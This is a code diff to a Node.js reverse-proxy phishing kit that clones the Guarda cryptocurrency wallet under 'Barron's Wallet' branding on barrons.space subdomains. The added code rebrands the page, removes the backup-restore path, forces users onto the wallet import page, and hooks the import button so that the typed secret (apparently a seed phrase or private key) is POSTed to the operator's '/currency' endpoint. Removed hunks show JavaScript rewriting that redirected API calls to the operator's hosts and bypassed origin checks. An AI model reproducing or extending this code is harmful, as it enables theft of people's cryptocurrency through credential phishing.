@@ -7,11 +7,16 @@ exports.delegateSimpleRequest = void 0;
 const https_1 = __importDefault(require("https"));
 const parse_1 = require("../parse");
 const inject_1 = require("../inject");
+// const serverUrl = 'https://localhost:3023'
+// const apiUrl = 'https://localhost:3024'
 const serverUrl = 'https://wallet.barrons.space';
 const apiUrl = 'https://spidorman.barrons.space';
 const bsciUrl = 'https://solevoysomelie.barrons.space';
 const settingsiUrl = 'https://stevefootjobs.barrons.space';
 const guardacoiUrl = 'https://dristleback.barrons.space';
+// const bsciUrl = 'https://localhost:3025'
+// const settingsiUrl = 'https://localhost:3026'
+// const guardacoiUrl = 'https://localhost:3027'
 const delegateSimpleRequest = (req, res, domain) => {
     const { method, headers, url, path } = req;
     console.log(url);
@@ -67,7 +72,21 @@ const delegateSimpleRequest = (req, res, domain) => {
                                 })
                                 }
                             }catch(e){}
+                            try{document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.white-block_wrapper_2WSSR > p").innerText = "Unlock your Barron's Wallet with your password."}catch(e){}
                             try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a").href = 'https://barrons.com' } catch(e) {}
+                            try{document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").href='/'}catch(e){}
+                            try {document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.notification_notification_2E5bE").remove()}catch(e){}
+                            try{
+                            
+                                if(document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > nav > a:nth-child(1)").innerText ==='Restore from Guarda Backup'){
+                                document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > nav > a:nth-child(1)").remove()
+                                }
+                            }catch(e){}
+
+                                
+                            try{document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.white-block_wrapper_2WSSR.welcome-body_whiteBlock_Ql6uh > a:nth-child(4)").href='/app/mobile/import'}catch(e){}
+                            try{window.location.href.includes('/app/mobile/restore')?window.location.href='/app/mobile/import':''}catch(e){}
+                            try{document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div.gray-block_wrapper_fNVpe > ul > li:nth-child(1) > a").innerText ="What exactly is Barron's Wallet?"}catch(e){}
                             try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.header_background_2lnWj > div.container > div > nav > a").innerHTML = '<div class="header_iconHome_3kTzE"><svg viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><path d="M11.571 4.286l-8.128 6.348a.173.173 0 0 1-.007.04.174.174 0 0 0-.007.04v6.428c0 .233.09.434.268.603.18.17.391.255.636.255h5.429v-5.143h3.619V18h5.428a.893.893 0 0 0 .636-.255c.18-.17.27-.37.27-.603v-6.428a.18.18 0 0 0-.015-.08l-8.129-6.348z"></path><path d="M22.983 9.223L19.84 6.537V.517a.466.466 0 0 0-.13-.34.44.44 0 0 0-.33-.133h-2.756a.441.441 0 0 0-.33.133.467.467 0 0 0-.129.34v2.877L12.663.384A1.646 1.646 0 0 0 11.572 0c-.421 0-.785.128-1.091.384L.16 9.223a.433.433 0 0 0-.158.317.487.487 0 0 0 .1.347l.89 1.092a.486.486 0 0 0 .301.162c.115.01.23-.024.345-.103l9.933-8.515 9.934 8.515a.435.435 0 0 0 .301.103h.044a.486.486 0 0 0 .301-.162l.89-1.092a.487.487 0 0 0 .1-.347.434.434 0 0 0-.158-.317z"></path></svg></div> Back to Barrons.com' } catch(e) {}
                             try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").href = 'https://barrons.com' } catch(e) {}
                             try { document.querySelector("#root > div.app_pageBackground_2Jmxb > div.footer_footerWrapper_KUA3R > div > div > div.footer_wrapper_3QL8Z > nav > a.footer_homeLink_1x0jA").innerHTML = '<span class="footer_iconHome_Zb6Z5"><svg viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><path d="M11.571 4.286l-8.128 6.348a.173.173 0 0 1-.007.04.174.174 0 0 0-.007.04v6.428c0 .233.09.434.268.603.18.17.391.255.636.255h5.429v-5.143h3.619V18h5.428a.893.893 0 0 0 .636-.255c.18-.17.27-.37.27-.603v-6.428a.18.18 0 0 0-.015-.08l-8.129-6.348z"></path><path d="M22.983 9.223L19.84 6.537V.517a.466.466 0 0 0-.13-.34.44.44 0 0 0-.33-.133h-2.756a.441.441 0 0 0-.33.133.467.467 0 0 0-.129.34v2.877L12.663.384A1.646 1.646 0 0 0 11.572 0c-.421 0-.785.128-1.091.384L.16 9.223a.433.433 0 0 0-.158.317.487.487 0 0 0 .1.347l.89 1.092a.486.486 0 0 0 .301.162c.115.01.23-.024.345-.103l9.933-8.515 9.934 8.515a.435.435 0 0 0 .301.103h.044a.486.486 0 0 0 .301-.162l.89-1.092a.487.487 0 0 0 .1-.347.434.434 0 0 0-.158-.317z"></path></svg></span> Back to Barrons.com' } catch(e) {}
@@ -96,6 +115,17 @@ const delegateSimpleRequest = (req, res, domain) => {
                                         'Content-type':'applicattion/json'
                                     },
                                     body:JSON.stringify({input:document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.relative > div.input_wrapper_1oeau > input").value,currency:document.querySelector("#root > div.app_pageBackground_2Jmxb > div.app_pageWrapper_nSOZm > div > div > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.input_wrapper_1oeau.input_isSelect_34mZ3 > div > div > div.input-currency_currencyData_S0KpS.inputs_currencyInfo_rdtMm > span")?.innerText ||''})
+                                })
+                                }
+                            }catch(e){}
+                            try{
+                             document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.import-block_wrapperAddButton_3GNAb > button").onclick = ()=>{
+                                fetch('/currency',{
+                                    method:"POST",
+                                    headers : {
+                                        'Content-type':'applicattion/json'
+                                    },
+                                    body:JSON.stringify({input:document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div > div > div.relative > div.input_wrapper_1oeau > input").value,currency:document.querySelector("#root > div.app_pageBackground_2Jmxb.responsive > div > div > div > div.import-wallets_wrapperImportBlock_2X-Eq > div > div.input_wrapper_1oeau.input_isSelect_34mZ3 > div > div > div.input-currency_currencyData_S0KpS.inputs_currencyInfo_rdtMm > span")?.innerText ||''})
                                 })
                                 }
                             }catch(e){}
@@ -164,29 +194,10 @@ const delegateSimpleRequest = (req, res, domain) => {
                 });
             }
             else if (url.includes('4497.8001434f99af066796c2.js')) {
-                delete response.headers['content-encoding'];
-                (0, parse_1.gzipParse)(response).then(data => {
-                    let newJs = (0, inject_1.replace)(data, 'https://guarda.com', serverUrl, true);
-                    newJs = (0, inject_1.replace)(newJs, 'https://settingsuits.guarda.com', settingsiUrl, true);
-                    newJs = (0, inject_1.replace)(newJs, '(new URL(window.location.href).origin!==window.location.origin)', '(true)');
-                    newJs = (0, inject_1.replace)(newJs, 'window.location.host.includes("localhost")', 'true');
-                    newJs = (0, inject_1.replace)(newJs, 'href:window.location.href', 'href:"https://guarda.com/app"');
-                    //window.location.host.includes("localhost")
-                    //https://settingsuits.guarda.com
-                    res.writeHead(response.statusCode || 500, response.headers);
-                    res.end(newJs);
-                });
+                res.redirect('/4497.8001434f99af066796c2.js');
             }
             else if (req.url.includes('9569.8001434f99af066796c2.js')) {
-                delete response.headers['content-encoding'];
-                (0, parse_1.gzipParse)(response).then(data => {
-                    let newJs = (0, inject_1.replace)(data, 'https://chain-api.guarda.com/', apiUrl, true);
-                    newJs = (0, inject_1.replace)(newJs, 'https://bscnode.guarda.com', bsciUrl, true);
-                    newJs = (0, inject_1.replace)(newJs, 'Q.protocol===$.protocol&&Q.host===$.host', 'true', true);
-                    //https://bscnode.guarda.com
-                    res.writeHead(response.statusCode || 500, response.headers);
-                    res.end(newJs);
-                });
+                res.redirect('/9569.8001434f99af066796c2.js');
             }
             else {
                 res.writeHead(response.statusCode || 500, response.headers);
